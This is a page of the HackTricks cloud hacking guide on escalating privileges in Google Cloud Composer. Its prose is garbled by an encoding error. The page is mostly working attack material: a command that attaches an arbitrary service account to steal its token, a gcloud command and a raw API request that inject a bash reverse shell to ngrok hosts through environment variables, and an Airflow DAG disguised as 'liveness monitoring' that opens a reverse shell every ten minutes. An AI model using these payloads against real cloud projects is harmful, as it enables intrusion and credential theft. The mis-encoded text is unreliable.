# GCP - Composer Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## composer

More info in:

{% content-ref url="../gcp-services/gcp-composer-enum.md" %}
[gcp-composer-enum.md](../gcp-services/gcp-composer-enum.md)
{% endcontent-ref %}

### `composer.environments.create`

æ–°ã—ãä½œæˆã•ã‚ŒãŸcomposerç’°å¢ƒã«ãã®æ¨©é™ã‚’æŒã¤**ä»»æ„ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã‚’**æ·»ä»˜ã™ã‚‹**ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ãã®å¾Œã€composerå†…ã§ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¦ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
gcloud composer environments create privesc-test \
--project "${PROJECT_ID}" \
--location europe-west1 \
--service-account="${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com"
```
More info about the exploitation [**here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/i-composer.environmets.create.sh).

### `composer.environments.update`

composer ç’°å¢ƒã‚’æ›´æ–°ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã€ä¾‹ãˆã°ã€env å¤‰æ•°ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% code overflow="wrap" %}
```bash
# Even if it says you don't have enough permissions the update happens
gcloud composer environments update \
projects/<project-id>/locations/<location>/environments/<composer-env-name> \
--update-env-variables="PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/19990 0>&1' & #%s" \
--location <location> \
--project <project-id>

# Call the API endpoint directly
PATCH /v1/projects/<project-id>/locations/<location>/environments/<composer-env-name>?alt=json&updateMask=config.software_config.env_variables HTTP/2
Host: composer.googleapis.com
User-Agent: google-cloud-sdk gcloud/480.0.0 command/gcloud.composer.environments.update invocation-id/826970373cd441a8801d6a977deba693 environment/None environment-version/None client-os/MACOSX client-os-ver/23.4.0 client-pltf-arch/arm interactive/True from-script/False python/3.12.3 term/xterm-256color (Macintosh; Intel Mac OS X 23.4.0)
Accept-Encoding: gzip, deflate, br
Accept: application/json
Content-Length: 178
Content-Type: application/json
X-Goog-Api-Client: cred-type/sa
Authorization: Bearer [token]
X-Allowed-Locations: 0x0

{"config": {"softwareConfig": {"envVariables": {"BROWSER": "/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/1890 0>&1' & #%s", "PYTHONWARNINGS": "all:0:antigravity.x:0:0"}}}}
```
{% endcode %}

TODO: ç’°å¢ƒã«æ–°ã—ã„pypiãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã‚’è¿½åŠ ã—ã¦RCEã‚’å–å¾—ã™ã‚‹

### Dagsã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰

å®Ÿè¡Œä¸­ã®dagsã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’ç¢ºèªã—ã¾ã™ï¼š

{% code overflow="wrap" %}
```bash
mkdir /tmp/dags
gcloud composer environments storage dags export --environment <environment> --location <loc> --destination /tmp/dags
```
{% endcode %}

### DAGã®ã‚¤ãƒ³ãƒãƒ¼ãƒˆ

Python DAGã‚³ãƒ¼ãƒ‰ã‚’ãƒ•ã‚¡ã‚¤ãƒ«ã«è¿½åŠ ã—ã€æ¬¡ã®ã‚ˆã†ã«å®Ÿè¡Œã—ã¦ã‚¤ãƒ³ãƒãƒ¼ãƒˆã—ã¾ã™ï¼š

{% code overflow="wrap" %}
```bash
# TODO: Create dag to get a rev shell
gcloud composer environments storage dags import --environment test --location us-central1 --source /tmp/dags/reverse_shell.py
```
{% endcode %}

ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«DAG:

{% code title="reverse_shell.py" %}
```python
import airflow
from airflow import DAG
from airflow.operators.bash_operator import BashOperator
from datetime import timedelta

default_args = {
'start_date': airflow.utils.dates.days_ago(0),
'retries': 1,
'retry_delay': timedelta(minutes=5)
}

dag = DAG(
'reverse_shell',
default_args=default_args,
description='liveness monitoring dag',
schedule_interval='*/10 * * * *',
max_active_runs=1,
catchup=False,
dagrun_timeout=timedelta(minutes=10),
)

# priority_weight has type int in Airflow DB, uses the maximum.
t1 = BashOperator(
task_id='bash_rev',
bash_command='bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/14382 0>&1',
dag=dag,
depends_on_past=False,
priority_weight=2**31 - 1,
do_xcom_push=False)
```
{% endcode %}

### Composerãƒã‚±ãƒƒãƒˆã¸ã®æ›¸ãè¾¼ã¿ã‚¢ã‚¯ã‚»ã‚¹

Composerç’°å¢ƒã®ã™ã¹ã¦ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆï¼ˆDAGã€ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã€ãƒ‡ãƒ¼ã‚¿ï¼‰ã¯GCPãƒã‚±ãƒƒãƒˆå†…ã«ä¿å­˜ã•ã‚Œã¦ã„ã¾ã™ã€‚æ”»æ’ƒè€…ãŒãã‚Œã«å¯¾ã—ã¦èª­ã¿å–ã‚ŠãŠã‚ˆã³æ›¸ãè¾¼ã¿æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ãƒã‚±ãƒƒãƒˆã‚’ç›£è¦–ã—ã€**DAGãŒä½œæˆã¾ãŸã¯æ›´æ–°ã•ã‚Œã‚‹ãŸã³ã«ã€ãƒãƒƒã‚¯ãƒ‰ã‚¢ä»˜ãã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’æå‡ºã™ã‚‹**ã“ã¨ã§ã€Composerç’°å¢ƒãŒã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã‹ã‚‰ãƒãƒƒã‚¯ãƒ‰ã‚¢ä»˜ãã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®æ”»æ’ƒã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã¯ä»¥ä¸‹ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

{% content-ref url="gcp-storage-privesc.md" %}
[gcp-storage-privesc.md](gcp-storage-privesc.md)
{% endcontent-ref %}

### ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã®ã‚¤ãƒ³ãƒãƒ¼ãƒˆ

TODO: ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ã§å¦¥å”ã§ãã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹

### ãƒ‡ãƒ¼ã‚¿ã®ã‚¤ãƒ³ãƒãƒ¼ãƒˆ

TODO: ãƒ‡ãƒ¼ã‚¿ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ã§å¦¥å”ã§ãã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
